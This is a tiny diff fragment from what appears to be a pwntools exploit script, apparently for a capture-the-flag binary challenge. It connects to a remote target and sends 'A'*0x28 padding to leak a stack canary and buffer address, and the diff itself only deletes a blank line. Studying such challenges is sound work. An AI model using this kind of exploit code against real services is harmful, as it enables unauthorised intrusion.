@@ -84,7 +84,6 @@ if debug:
 else:
     sh=remote(remote_addr)
 
-
 sh.sendlineafter(".",'999')
 # get canary,buff_addr
 sh.sendline('A'*0x28)
